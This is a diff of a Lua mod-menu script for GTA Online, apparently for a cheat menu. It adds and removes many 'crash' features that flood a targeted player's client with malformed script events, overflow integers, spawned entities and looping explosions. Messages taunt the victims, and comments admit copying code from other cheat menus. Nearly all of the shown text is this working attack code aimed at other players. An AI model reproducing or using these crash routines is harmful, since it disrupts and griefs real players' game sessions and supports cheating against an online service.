-                    util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
-                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                end
-                util.yield()
-                for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                end
-menu.trigger_commands("notifyspam" .. players.get_name(pid))
-menu.trigger_commands("ring" .. players.get_name(pid))
-menu.trigger_commands("explode" .. players.get_name(pid))
-        menu.trigger_commands("explodeloop" .. players.get_name(pid))
-menu.trigger_commands("explosiondelay".. players.get_name(pid) .. " 50")
-menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
-        menu.trigger_commands("ptfx" .. players.get_name(pid))
-        menu.trigger_commands("ptfxamount" .. players.get_name(pid) .. " 250")
-        menu.trigger_commands("ptfxsize" .. players.get_name(pid) .. " 10")
-        menu.trigger_commands("givesh" .. players.get_name(pid))
-        menu.trigger_commands("givesh" .. players.get_name(pid))
-            util.yield(100)
-                util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
-                util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
-                util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
-                util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
-                util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
-                util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
-                util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
-                util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
-                util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
-                util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-    notification("Doge that shit then! " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-            end)
+                menu.toggle_loop(scrash, "Automobile Crash", {"toggleautomob"}, "Sends ped's and automobiles causing (S0) events. Blocked by most popular menus.", function(on_toggle)
+                    notification("Automobile Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                            local int_min = -2147483647
+                            local int_max = 2147483647
+                                for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+                                end
+                                util.yield()
+                                for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+                                end
+                    menu.trigger_commands("givesh" .. players.get_name(pid))
+                                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+                    notification("Automobile Crash Sent To " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                            end)
 
-
-    menu.toggle_loop(damncrash, "Damn Crash", {"toggledamn"}, "This one is bound to hurt.", function(on_toggle)
-    notification("Damn Crash Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-            local int_min = -2147483647
-            local int_max = 2147483647
-                for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
-                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                end
-                util.yield()
-                for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                end
-menu.trigger_commands("notifyspam" .. players.get_name(pid))
-menu.trigger_commands("explode" .. players.get_name(pid))
-        menu.trigger_commands("explodeloop" .. players.get_name(pid))
-menu.trigger_commands("explosiondelay".. players.get_name(pid) .. " 50")
-menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
-        menu.trigger_commands("ptfx" .. players.get_name(pid))
-        menu.trigger_commands("ptfxamount" .. players.get_name(pid) .. " 250")
-        menu.trigger_commands("ptfxsize" .. players.get_name(pid) .. " 10")
-        menu.trigger_commands("givesh" .. players.get_name(pid))
-            util.yield(100)
-                util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
-                util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
-                util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
-                util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
-                util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
-                util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
-                util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
-                util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
-                util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
-                util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-    notification("Doge that shit then! " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-            end)
-
+                menu.toggle_loop(scrash, "Autobike Crash", {"toggleautobike"}, "Skidded from X-Force script event code.", function(on_toggle)
+                    notification("Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
+                            local int_min = -2147483647
+                            local int_max = 2147483647
+                                for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, math.random(int_min, int_max), math.random(int_min, int_max), 
+                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
+                                end
+                                util.yield()
+                                for i = 1, 15 do
+                                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, pid, math.random(int_min, int_max)})
+                                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
+                                end
+                menu.trigger_commands("givesh" .. players.get_name(pid))
+                                util.trigger_script_event(1 << pid, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
+                            end)
 
 
             local oxtypecrash = menu.list(crash, "Ox Menu Type Crashes", {}, "From Nightfall")
 
         
-            menu.toggle(oxtypecrash, "All Ox Menu Type Crashes On", {"oxallcrash"}, "WARNING: DO NOT SPECTATE! & Toggle Panic Mode Or You Most Likly Crash.", function(on_toggle)
+            menu.toggle(oxtypecrash, "All Ox Menu Type Crashes On", {"oxallcrash"}, "", function(on_toggle)
                 if on_toggle then
-                menu.trigger_commands("poodlecrash" .. players.get_name(pid))
-                util.yield(10)
                 menu.trigger_commands("beverlycrash" .. players.get_name(pid))
                 util.yield(10)
                 menu.trigger_commands("fabiencrash" .. players.get_name(pid))
@@ -11639,8 +11708,6 @@ menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
                 menu.trigger_commands("siemoncrash" .. players.get_name(pid))
                 util.yield(10)
             else
-                menu.trigger_commands("poodlecrash" .. players.get_name(pid))
-                util.yield(10)
                 menu.trigger_commands("beverlycrash" .. players.get_name(pid))
                 util.yield(10)
                 menu.trigger_commands("fabiencrash" .. players.get_name(pid))
@@ -11668,31 +11735,6 @@ menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
                 menu.trigger_commands("superc")
                             end
                       end)
-            
-            menu.toggle_loop(oxtypecrash, "Poodle Crash", {"poodlecrash"}, "", function(on_toggle)
-            
-                local mdl = util.joaat('a_c_poodle')
-                    if request_model(mdl, 2) then
-                        local pos = players.get_position(pid)
-                        util.yield(100)
-                        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
-                        ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 1, 0), 0)
-                        local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
-                        WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
-                        local obj
-                        repeat
-                            obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
-                        until obj ~= 0 or util.yield()
-                        ENTITY.DETACH_ENTITY(obj, true, true) 
-                        util.yield(1500)
-                        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
-                        entities.delete_by_handle(ped1)
-                        util.yield(1000)
-                else
-                        util.toast("Failed to load model. :/")
-            notification("Worth it HAHA!!!", colors.red)
-                end
-            end)
             
             menu.toggle_loop(oxtypecrash, "Beverly Crash", {"beverlycrash"}, "", function(on_toggle)
             
@@ -11978,290 +12020,6 @@ menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
             end
             
             end)
-            
-
-
-local dogecrash = menu.list(crash, "Doge Coin Crash", {}, "")
-
-    menu.action(dogecrash, "Doge Coin Crash", {"doge"}, "Skidded the code from a notification Rimuru's doge coin crash sent me and it works well.", function()
-    notification("Damn Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-            local int_min = -2147483647
-            local int_max = 2147483647
-                for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
-                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                end
-                util.yield()
-                for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440 , math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                end
-        menu.trigger_commands("givesh" .. players.get_name(pid))
-            util.yield(100)
-                util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
-                util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
-                util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
-                util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
-                util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
-                util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
-                util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
-                util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
-                util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
-                util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-    notification("How did that feel? " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-            end)
-
-
-    menu.toggle_loop(dogecrash, "Doge Coin Crash", {"toggledoge"}, "Skidded the code from a notification Rimuru's doge coin crash sent me and it works well.", function(on_toggle)
-    notification("Damn Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-            local int_min = -2147483647
-            local int_max = 2147483647
-                for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
-                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                end
-                util.yield()
-                for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440 , math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                end
-        menu.trigger_commands("givesh" .. players.get_name(pid))
-            util.yield(100)
-                util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
-                util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
-                util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
-                util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
-                util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
-                util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
-                util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
-                util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
-                util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
-                util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-    notification("How did that feel? " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-               end)
-
-
-
-local powcrash = menu.list(crash, "Pow right in the kisser", {}, "")
-
-    menu.action(powcrash, "Pow right in the kisser", {"pow"}, "A very strong SE/SH crash", function()
-    notification("Pow right in the kisser sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-            local int_min = -2147483647
-            local int_max = 2147483647
-                for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
-                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                end
-                util.yield()
-                for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                end
-        menu.trigger_commands("givesh" .. players.get_name(pid))
-            util.yield(100)
-                util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
-                util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
-                util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-            end)
-
-    menu.toggle_loop(powcrash, "Pow right in the kisser", {"togglepow"}, "A very strong SE/SH crash", function(on_toggle)
-    notification("Pow right in the kisser sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-            local int_min = -2147483647
-            local int_max = 2147483647
-                for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
-                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-                end
-                util.yield()
-                for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
-                end
-        menu.trigger_commands("givesh" .. players.get_name(pid))
-            util.yield(100)
-                util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
-                util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
-                util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-                util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-            end)
-
-
-    local scrash = menu.list(crash, "TODO Crash (S1)", {}, "")
-
-    	menu.action(scrash, "TODO Crash (S1)", {"s1crash"}, "", function()
-    	notification("TODO Crash (S1) sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-        		local int_min = -2147483647
-        		local int_max = 2147483647
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
-            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-        			end
-        			util.yield()
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-        			end
-        	menu.trigger_commands("givesh" .. players.get_name(pid))
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-    	notification("TODO Crashed" .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-    			end)
-
-    	menu.toggle_loop(scrash, "TODO Crash (S1)", {"toggles1crash"}, "Note: DO NOT SPECTATE WHEN TOGGLED.", function(on_toggle)
-    	notification("TODO Crash (S1) sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-        		local int_min = -2147483647
-        		local int_max = 2147483647
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
-            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-        			end
-        			util.yield()
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-        			end
-        	menu.trigger_commands("givesh" .. players.get_name(pid))
-        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
-    	notification("TODO Crashed (S1) " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-    			end)
-
-    local bozocrash = menu.list(crash, "Bozo Deleter Crash", {}, "")
-
-menu.action(bozocrash, "Bozo Deleter Crash", {"bozocrash"}, "Sends a really strong crash coded by Mr.Pro.", function()
-        notification("Bozo Deleter Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-                local int_min = -2147483647
-                local int_max = 2147483647
-                    for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778, math.random(int_min, int_max), math.random(int_min, int_max),
-                        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-                        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-                    end
-                    util.yield()
-                    for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
-                    end
-            menu.trigger_commands("givesh" .. players.get_name(pid))
-                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
-        notification("Bozo deleter sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-                end)
-
-menu.toggle_loop(bozocrash, "Bozo Deleter Crash", {"togglebozocrash"}, "Sends a really strong crash coded by Mr.Pro.", function(on_toggle)
-        notification("Bozo Deleter Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-                local int_min = -2147483647
-                local int_max = 2147483647
-                    for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778, math.random(int_min, int_max), math.random(int_min, int_max),
-                        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-                        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-                    end
-                    util.yield()
-                    for i = 1, 15 do
-                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
-                    end
-            menu.trigger_commands("givesh" .. players.get_name(pid))
-                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
-        notification("Bozo deleter sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-                end)
-
-
-    local skidpowcrash = menu.list(crash, "Skid Crash", {}, "")
-
-    	menu.action(skidpowcrash, "Skid Crash", {"skidpow"}, "Skidded from 2take1 code crashes modders woop woop.", function()
-    	notification("Skid Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
